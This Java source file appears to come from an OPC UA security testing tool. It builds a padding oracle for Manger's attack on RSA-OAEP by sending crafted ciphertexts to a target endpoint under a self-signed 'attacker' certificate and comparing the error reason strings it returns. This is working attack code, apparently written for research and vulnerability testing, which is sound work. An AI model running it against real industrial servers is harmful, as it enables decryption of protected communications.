package attacks.manger.oracle.learner;

import attacks.manger.MangerUtility;
import attacks.manger.oracle.*;
import opcua.context.Endpoint;
import opcua.context.LocalKeyPair;
import opcua.encoding.EncodingException;
import opcua.message.ErrorMessage;
import reporting.entry.Entry;
import reporting.entry.Group;
import reporting.entry.ValueEntry;
import transport.SecureChannelUtil;

import java.io.IOException;

/**
 * Creates an oracle, if an endpoint returns distinguishable error reason strings.
 */
public class SimpleErrorReasonOracleLearner implements OracleLearner {
    private final int numberOfVerifications;
    private final LocalKeyPair localKeyPair;

    /**
     * Constructor
     * @param localKeyPair Certificate and private key to use for queries
     * @param numberOfVerifications How often to verify, if an error code was not returned by chance
     */
    public SimpleErrorReasonOracleLearner(LocalKeyPair localKeyPair, int numberOfVerifications) {
        this.localKeyPair = localKeyPair;
        this.numberOfVerifications = numberOfVerifications;
    }

    /**
     * Constructor that will create a new self-signed certificate for queries
     * @param numberOfVerifications How often to verify, if an error code was not returned by chance
     */
    public SimpleErrorReasonOracleLearner(int numberOfVerifications) {
        this.numberOfVerifications = numberOfVerifications;
        this.localKeyPair = LocalKeyPair.generateSelfSigned(2048, "CN:OpcUa-Attacker");
    }

    /**
     * Tries to learn an distinguishable error message oracle for Manger's attack, targeting a specific endpoint
     * @param endpoint Endpoint to test
     * @return The result of the learning, including the oracle, if successful
     * @throws OracleException if security configuration of endpoint does not allow for Manger's attack
     */
    @Override
    public LearningResult learn(Endpoint endpoint) throws OracleException {
        MangerUtility.throwIfSecurityConfigurationUnsupported(endpoint);

        try {
            byte[] validCipherText = SecureChannelUtil.generateEncryptedOpnRequest(endpoint, localKeyPair);
            VictimProxy victimProxy = new VictimProxy(endpoint, validCipherText);

            String reasonLessB = ((ErrorMessage)victimProxy.sendEncryptedPlainBlock(MangerUtility.generatePlaintextLessB(endpoint.getPublicKey())).getResponse()).getReason();
            for (int i=0; i<numberOfVerifications; i++) {
                String anotherReasonLessB = ((ErrorMessage)victimProxy.sendEncryptedPlainBlock(MangerUtility.generatePlaintextLessB(endpoint.getPublicKey())).getResponse()).getReason();
                if(!anotherReasonLessB.equals(reasonLessB)) {
                    return createFailureResult("Server responded with multiple error reasons for \"<B\"");
                }
            }

            String reasonGeqB = ((ErrorMessage)victimProxy.sendEncryptedPlainBlock(MangerUtility.generatePlaintextGeqB(endpoint.getPublicKey())).getResponse()).getReason();
            if (reasonLessB.equals(reasonGeqB)) {
                return createFailureResult("Server responded with equal error reasons for \"<B\" and \">=B\" (" + reasonLessB + ")");
            }

            for (int i=0; i<numberOfVerifications; i++) {
                String anotherReasonGeqB = ((ErrorMessage)victimProxy.sendEncryptedPlainBlock(MangerUtility.generatePlaintextGeqB(endpoint.getPublicKey())).getResponse()).getReason();
                if(!anotherReasonGeqB.equals(reasonGeqB)) {
                    return createFailureResult("Server responded with multiple error reasons for \">=B\"");
                }
            }

            Oracle oracle = new RobustDistinguishableErrorOracle(
                    (ErrorMessage e) -> e.getReason().equals(reasonLessB),
                    (ErrorMessage e) -> e.getReason().equals(reasonGeqB),
                    10
            );
            Entry report = new Group("SimpleErrorReasonOracleLearner")
                    .addSubEntry(new ValueEntry<>("Successful", true))
                    .addSubEntry(new ValueEntry<>("Reason for \"<B\"", reasonLessB))
                    .addSubEntry(new ValueEntry<>("Reason for \">=B\"", reasonGeqB));

            return new LearningResult(oracle, report);
        }
        catch (EncodingException | IOException e) {
            throw new OracleException(e);
        }
    }

    private static LearningResult createFailureResult(String reason) {
        Entry report = new Group("SimpleErrorReasonOracleLearner")
                .addSubEntry(new ValueEntry<>("Successful", false))
                .addSubEntry(new ValueEntry<>("Reason", reason));
        return new LearningResult(report);
    }
}
